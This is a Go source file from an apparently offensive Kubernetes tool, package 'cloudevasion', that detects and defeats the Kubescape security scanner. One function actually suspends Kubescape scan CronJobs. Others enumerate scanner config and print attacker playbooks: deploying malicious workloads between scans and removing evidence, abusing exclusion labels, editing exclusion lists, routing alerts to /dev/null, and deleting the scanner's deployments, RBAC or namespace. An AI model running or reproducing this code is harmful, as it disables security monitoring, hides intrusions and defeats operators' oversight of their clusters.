package cloudevasion

import (
	"context"
	"fmt"
	"strings"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var kubescapeScanGVR = schema.GroupVersionResource{
	Group: "spdx.softwarecomposition.kubescape.io", Version: "v1beta1", Resource: "vulnerabilitymanifests",
}

var kubescapeConfigScanGVR = schema.GroupVersionResource{
	Group: "spdx.softwarecomposition.kubescape.io", Version: "v1beta1", Resource: "configurationscansummaries",
}

func detectKubescape(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"kubescape", "armo-system", "kube-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app.kubernetes.io/name=kubescape",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "kubescape",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d kubescape pods", len(pods.Items)),
			}}
		}

		pods, err = client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=kubescape",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "kubescape",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d kubescape operator pods", len(pods.Items)),
			}}
		}
	}

	cronjobs, err := client.BatchV1().CronJobs("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cj := range cronjobs.Items {
			if strings.Contains(cj.Name, "kubescape") {
				return []DetectionSystem{{
					Name:      "kubescape",
					Detected:  true,
					Namespace: cj.Namespace,
					Details:   fmt.Sprintf("scan CronJob: %s schedule=%s", cj.Name, cj.Spec.Schedule),
				}}
			}
		}
	}

	return nil
}

// EvadeKubescape executes the specified Kubescape evasion technique.
func EvadeKubescape(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "scan_timing":
		return kubescapeScanTiming(ctx, client)
	case "label_exclusion":
		return kubescapeLabelExclusion(ctx, client, dynClient)
	case "disable_scans":
		return kubescapeDisableScans(ctx, client)
	case "config_modify":
		return kubescapeConfigModify(ctx, client)
	default:
		return kubescapeScanTiming(ctx, client)
	}
}

func kubescapeScanTiming(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Kubescape Scan Timing Analysis:\n\n")

	sb.WriteString("  Kubescape performs periodic posture scans (not real-time).\n")
	sb.WriteString("  Operations between scans are invisible to posture checks.\n\n")

	cronjobs, err := client.BatchV1().CronJobs("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list CronJobs: %v\n", err)
		return &EvasionResult{Technique: "scan_timing", Success: false, Output: sb.String()}, nil
	}

	found := false
	for _, cj := range cronjobs.Items {
		if strings.Contains(cj.Name, "kubescape") || strings.Contains(cj.Name, "kubevuln") || strings.Contains(cj.Name, "armo") {
			found = true
			fmt.Fprintf(&sb, "  Scan job: %s/%s\n", cj.Namespace, cj.Name)
			fmt.Fprintf(&sb, "    Schedule: %s\n", cj.Spec.Schedule)

			if cj.Status.LastScheduleTime != nil {
				lastRun := cj.Status.LastScheduleTime.Time
				fmt.Fprintf(&sb, "    Last run: %s\n", lastRun.Format(time.RFC3339))
				fmt.Fprintf(&sb, "    Age: %s ago\n", time.Since(lastRun).Truncate(time.Second))
			}

			if cj.Spec.Suspend != nil && *cj.Spec.Suspend {
				sb.WriteString("    Status: SUSPENDED\n")
			} else {
				sb.WriteString("    Status: Active\n")
			}
			sb.WriteString("\n")
		}
	}

	if !found {
		sb.WriteString("  No Kubescape CronJobs found — may use in-cluster operator scheduling\n")
		sb.WriteString("  Check for kubescape-scheduler deployment\n")
	}

	sb.WriteString("  Strategy:\n")
	sb.WriteString("    - Deploy malicious workloads immediately AFTER scan completes\n")
	sb.WriteString("    - Remove evidence before next scan window\n")
	sb.WriteString("    - Posture scans typically run every 4-24 hours\n")
	sb.WriteString("    - Kubescape doesn't do runtime enforcement — only posture checks\n")
	sb.WriteString("    - Modifications between scans are completely invisible\n")

	return &EvasionResult{
		Technique: "scan_timing",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

func kubescapeLabelExclusion(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Kubescape Label Exclusion:\n\n")

	sb.WriteString("  Kubescape uses namespace/label selectors for scan scope.\n")
	sb.WriteString("  Workloads with exclusion labels are skipped by the scanner.\n\n")

	configMaps, err := client.CoreV1().ConfigMaps("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list ConfigMaps: %v\n", err)
		return &EvasionResult{Technique: "label_exclusion", Success: false, Output: sb.String()}, nil
	}

	for _, cm := range configMaps.Items {
		if strings.Contains(cm.Name, "kubescape") || strings.Contains(cm.Name, "armo") {
			fmt.Fprintf(&sb, "  ConfigMap: %s/%s\n", cm.Namespace, cm.Name)
			for key, val := range cm.Data {
				if strings.Contains(key, "config") || strings.Contains(key, "exclude") || strings.Contains(key, "scope") {
					preview := val
					if len(preview) > 200 {
						preview = preview[:200] + "..."
					}
					fmt.Fprintf(&sb, "    %s: %s\n", key, preview)
				}
			}
		}
	}

	_ = dynClient

	sb.WriteString("\n  Common exclusion patterns:\n")
	sb.WriteString("    - Namespace annotation: kubescape.io/exclude=true\n")
	sb.WriteString("    - Namespace label: kubescape.io/skip-scan=true\n")
	sb.WriteString("    - Pod annotation: armo.cloud/exclude=true\n")
	sb.WriteString("    - System namespaces (kube-system) often excluded by default\n\n")

	sb.WriteString("  Evasion actions:\n")
	sb.WriteString("    1. Label target namespace with exclusion annotation\n")
	sb.WriteString("    2. Deploy workloads in kube-system (often whitelisted)\n")
	sb.WriteString("    3. Add armo.cloud/exclude=true to pod annotations\n")
	sb.WriteString("    4. Modify Kubescape ConfigMap to extend exclusion list\n")

	return &EvasionResult{
		Technique: "label_exclusion",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func kubescapeDisableScans(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Kubescape Scan Disable:\n\n")

	cronjobs, err := client.BatchV1().CronJobs("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list CronJobs: %v\n", err)
		return &EvasionResult{Technique: "disable_scans", Success: false, Output: sb.String()}, nil
	}

	suspended := 0
	for _, cj := range cronjobs.Items {
		if strings.Contains(cj.Name, "kubescape") || strings.Contains(cj.Name, "kubevuln") || strings.Contains(cj.Name, "armo") {
			fmt.Fprintf(&sb, "  Target: %s/%s (schedule=%s)\n", cj.Namespace, cj.Name, cj.Spec.Schedule)

			suspend := true
			cj.Spec.Suspend = &suspend
			_, err := client.BatchV1().CronJobs(cj.Namespace).Update(ctx, &cj, metav1.UpdateOptions{})
			if err != nil {
				fmt.Fprintf(&sb, "    Suspend failed: %v\n", err)
			} else {
				fmt.Fprintf(&sb, "    [+] Suspended scan CronJob\n")
				suspended++
			}
		}
	}

	if suspended == 0 {
		sb.WriteString("  No scan CronJobs could be suspended\n")
		sb.WriteString("  Alternative: delete the CronJob entirely\n\n")
	}

	sb.WriteString("\n  Additional disruption vectors:\n")
	sb.WriteString("    - Delete kubescape-scheduler deployment\n")
	sb.WriteString("    - Scale kubescape operator to 0 replicas\n")
	sb.WriteString("    - Remove kubescape service account RBAC\n")
	sb.WriteString("    - Patch CronJob schedule to far-future (\"0 0 31 2 *\")\n")
	sb.WriteString("    - Modify kubescape container image to a no-op\n")

	return &EvasionResult{
		Technique: "disable_scans",
		Success:   suspended > 0,
		Output:    sb.String(),
	}, nil
}

func kubescapeConfigModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Kubescape Configuration Modification:\n\n")

	namespaces := []string{"kubescape", "armo-system", "kube-system"}
	modified := false

	for _, ns := range namespaces {
		configMaps, err := client.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, cm := range configMaps.Items {
			if strings.Contains(cm.Name, "kubescape") || strings.Contains(cm.Name, "armo") {
				fmt.Fprintf(&sb, "  ConfigMap: %s/%s\n", ns, cm.Name)

				for key := range cm.Data {
					fmt.Fprintf(&sb, "    Key: %s\n", key)
				}

				if cm.Data == nil {
					cm.Data = make(map[string]string)
				}

				if val, ok := cm.Data["config.json"]; ok {
					if !strings.Contains(val, "\"excludeNamespaces\"") {
						sb.WriteString("    No excludeNamespaces field — can inject one\n")
					} else {
						sb.WriteString("    excludeNamespaces exists — can extend list\n")
					}
				}

				modified = true
			}
		}
	}

	if !modified {
		sb.WriteString("  No Kubescape ConfigMaps found\n")
	}

	sb.WriteString("\n  Configuration attack vectors:\n")
	sb.WriteString("    1. Add target namespace to excludeNamespaces list\n")
	sb.WriteString("    2. Modify severity threshold (only report 'critical')\n")
	sb.WriteString("    3. Disable specific controls/frameworks\n")
	sb.WriteString("    4. Change scan scope from cluster to single namespace\n")
	sb.WriteString("    5. Modify alert destinations (send to /dev/null)\n")
	sb.WriteString("    6. Set compliance frameworks to empty list\n\n")

	sb.WriteString("  Impact: Kubescape will skip excluded resources entirely\n")
	sb.WriteString("  No violation alerts, no compliance failures reported\n")

	return &EvasionResult{
		Technique: "config_modify",
		Success:   modified,
		Output:    sb.String(),
	}, nil
}

// DisruptKubescape identifies disruption vectors for Kubescape deployments.
func DisruptKubescape(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Kubescape Disruption:\n\n")

	namespaces := []string{"kubescape", "armo-system"}
	found := false
	for _, ns := range namespaces {
		deps, err := client.AppsV1().Deployments(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, d := range deps.Items {
			if strings.Contains(d.Name, "kubescape") || strings.Contains(d.Name, "armo") {
				found = true
				fmt.Fprintf(&sb, "  Deployment: %s/%s\n", ns, d.Name)
				if d.Spec.Replicas != nil {
					fmt.Fprintf(&sb, "    Replicas: %d\n", *d.Spec.Replicas)
				}
			}
		}
	}

	if !found {
		sb.WriteString("  No Kubescape deployments found\n")
	}

	sb.WriteString("\n  Disruption techniques:\n")
	sb.WriteString("    - Scale operator to 0 replicas\n")
	sb.WriteString("    - Suspend all scan CronJobs\n")
	sb.WriteString("    - Delete RBAC: ClusterRole/ClusterRoleBinding for kubescape SA\n")
	sb.WriteString("    - Patch kubescape pods with non-existent image tag\n")
	sb.WriteString("    - Exhaust pod's memory limit with large scan targets\n")
	sb.WriteString("    - Network policy: block kubescape egress to cloud backend\n")
	sb.WriteString("    - Delete kubescape namespace entirely\n")

	return &EvasionResult{
		Technique: "disrupt_kubescape",
		Success:   found,
		Output:    sb.String(),
	}, nil
}
